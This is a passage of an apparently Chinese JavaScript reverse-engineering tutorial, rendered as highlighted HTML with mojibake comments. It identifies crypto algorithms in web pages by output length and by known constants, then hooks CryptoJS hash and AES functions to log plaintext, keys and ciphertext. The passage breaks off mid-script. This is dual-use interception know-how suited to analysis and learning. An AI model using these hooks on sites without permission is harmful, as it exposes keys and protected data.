<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">hexConstants</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">constants</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="s1">&#39;0x&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">toUpperCase</span><span class="p">());</span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">hexConstants</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">constant</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">found</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span><span class="w"> </span><span class="nx">algorithm</span><span class="o">:</span><span class="w"> </span><span class="nx">algo</span><span class="p">,</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="p">});</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">found</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="3-é€šè¿‡è¾“å‡ºç‰¹å¾è¯†åˆ«">3. é€šè¿‡è¾“å‡ºç‰¹å¾è¯†åˆ«</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ ¹æ®è¾“å‡ºé•¿åº¦åˆ¤æ–­å¯èƒ½çš„ç®—æ³•</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">guessAlgorithmByOutputLength</span><span class="p">(</span><span class="nx">output</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">output</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">lengthMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="mf">32</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;MD5 (hex)&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;MD4 (hex)&#39;</span><span class="p">],</span>
<span class="w">        </span><span class="mf">40</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;SHA-1 (hex)&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;RIPEMD-160 (hex)&#39;</span><span class="p">],</span>
<span class="w">        </span><span class="mf">64</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;SHA-256 (hex)&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SM3 (hex)&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;RIPEMD-256 (hex)&#39;</span><span class="p">],</span>
<span class="w">        </span><span class="mf">128</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;SHA-512 (hex)&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Whirlpool (hex)&#39;</span><span class="p">],</span>

<span class="w">        </span><span class="c1">// Base64 ç¼–ç çš„é•¿åº¦ï¼ˆè¿‘ä¼¼ï¼‰</span>
<span class="w">        </span><span class="mf">24</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;MD5 (base64)&#39;</span><span class="p">],</span>
<span class="w">        </span><span class="mf">28</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;SHA-1 (base64)&#39;</span><span class="p">],</span>
<span class="w">        </span><span class="mf">44</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;SHA-256 (base64)&#39;</span><span class="p">],</span>
<span class="w">        </span><span class="mf">88</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;SHA-512 (base64)&#39;</span><span class="p">]</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">lengthMap</span><span class="p">[</span><span class="nx">length</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;Unknown&#39;</span><span class="p">];</span>
<span class="p">}</span>

<span class="c1">// æµ‹è¯•ç¤ºä¾‹</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">guessAlgorithmByOutputLength</span><span class="p">(</span><span class="s1">&#39;5d41402abc4b2a76b9719d911017c592&#39;</span><span class="p">));</span>
<span class="c1">// Output: [&#39;MD5 (hex)&#39;, &#39;MD4 (hex)&#39;]</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬">è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬</h2>

      <h3 id="ç»¼åˆåŠ å¯†æ£€æµ‹è„šæœ¬">ç»¼åˆåŠ å¯†æ£€æµ‹è„šæœ¬</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// crypto-detector.js</span>
<span class="kd">class</span><span class="w"> </span><span class="nx">CryptoDetector</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">detectedAlgorithms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">();</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">suspiciousFunctions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// æ‰«æå…¨å±€å¯¹è±¡</span>
<span class="w">    </span><span class="nx">scanGlobalObjects</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">cryptoLibraries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">            </span><span class="s1">&#39;CryptoJS&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;forge&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;sjcl&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;crypto&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;subtle&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;JSEncrypt&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;aesjs&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;md5&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;sha1&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;sha256&#39;</span>
<span class="w">        </span><span class="p">];</span>

<span class="w">        </span><span class="nx">cryptoLibraries</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">lib</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">[</span><span class="nx">lib</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`âœ… å‘ç°åŠ å¯†åº“: </span><span class="si">${</span><span class="nx">lib</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">                </span><span class="k">this</span><span class="p">.</span><span class="nx">detectedAlgorithms</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">lib</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// æ£€æµ‹ Web Crypto API</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… å‘ç° Web Crypto API&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">detectedAlgorithms</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;WebCrypto&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// æ‰«æå·²åŠ è½½çš„ JS æ–‡ä»¶</span>
<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">scanLoadedScripts</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">scripts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">scripts</span><span class="p">);</span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">scripts</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="p">)</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span>

<span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="p">);</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>

<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">algorithms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectAlgorithmsInCode</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">algorithms</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“œ æ–‡ä»¶: </span><span class="si">${</span><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`   ç®—æ³•:`</span><span class="p">,</span><span class="w"> </span><span class="nx">algorithms</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`âš ï¸  æ— æ³•è¯»å–: </span><span class="si">${</span><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// åœ¨ä»£ç ä¸­æ£€æµ‹ç®—æ³•</span>
<span class="w">    </span><span class="nx">detectAlgorithmsInCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">algorithms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">        </span><span class="c1">// æ£€æµ‹å„ç§ç®—æ³•</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">detectors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="s1">&#39;MD5&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectMD5</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;SHA-1&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectSHA1</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;SHA-256&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectSHA256</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;AES&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectAES</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;DES&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectDES</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;RSA&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectRSA</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;Base64&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectBase64</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;HMAC&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectHMAC</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;SM3&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectSM3</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;SM4&#39;</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">detectSM4</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">detector</span><span class="p">]</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">detectors</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">detector</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">algorithms</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">algorithms</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// å„ç§æ£€æµ‹å‡½æ•°</span>
<span class="w">    </span><span class="nx">detectMD5</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/0x67452301|0xEFCDAB89|0x98BADCFE|md5/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectSHA1</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/0x67452301.*0xEFCDAB89.*0x98BADCFE.*0x10325476.*0xC3D2E1F0|sha1/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectSHA256</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/0x6A09E667|0xBB67AE85|sha256/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectAES</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/aes|rijndael|SubBytes|MixColumns|0x63.*0x7C.*0x77/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectDES</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/\bdes\b|feistel|permutation.*choice/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectRSA</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/\brsa\b|modpow|0x10001|65537/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectBase64</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/base64|atob|btoa|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectHMAC</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/hmac|hash.*based.*message.*authentication/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectSM3</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/sm3|0x7380166F/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">detectSM4</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="sr">/sm4|0xA3B1BAC6/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// ç”ŸæˆæŠ¥å‘Š</span>
<span class="w">    </span><span class="nx">generateReport</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;\n=== åŠ å¯†ç®—æ³•æ£€æµ‹æŠ¥å‘Š ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`æ£€æµ‹åˆ°çš„åŠ å¯†åº“æ•°é‡: </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">detectedAlgorithms</span><span class="p">.</span><span class="nx">size</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`æ£€æµ‹åˆ°çš„ç®—æ³•:`</span><span class="p">,</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">detectedAlgorithms</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨æ–¹æ³•</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">detector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">CryptoDetector</span><span class="p">();</span>
<span class="nx">detector</span><span class="p">.</span><span class="nx">scanGlobalObjects</span><span class="p">();</span>
<span class="nx">detector</span><span class="p">.</span><span class="nx">scanLoadedScripts</span><span class="p">().</span><span class="nx">then</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">detector</span><span class="p">.</span><span class="nx">generateReport</span><span class="p">();</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åŠ å¯†åº“-hook-è„šæœ¬">åŠ å¯†åº“ Hook è„šæœ¬</h2>

      <h3 id="hook-cryptojs">Hook CryptoJS</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âš ï¸  CryptoJS æœªåŠ è½½&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ£ å¼€å§‹ Hook CryptoJS&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Hook æ‰€æœ‰æ•£åˆ—ç®—æ³•</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hashAlgorithms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;MD5&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SHA1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SHA256&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SHA512&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SHA3&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;RIPEMD160&#39;</span><span class="p">];</span>

<span class="w">    </span><span class="nx">hashAlgorithms</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">algo</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">[</span><span class="nx">algo</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">[</span><span class="nx">algo</span><span class="p">];</span>
<span class="w">            </span><span class="nx">CryptoJS</span><span class="p">[</span><span class="nx">algo</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ” [CryptoJS.</span><span class="si">${</span><span class="nx">algo</span><span class="si">}</span><span class="sb">]`</span><span class="p">);</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`   è¾“å…¥:`</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>

<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`   è¾“å‡º:`</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">            </span><span class="p">};</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// Hook AES åŠ å¯†</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalDecrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">;</span>

<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” [CryptoJS.AES.encrypt]&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   æ˜æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†é’¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   é…ç½®:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">);</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å¯†æ–‡:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   Base64:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>

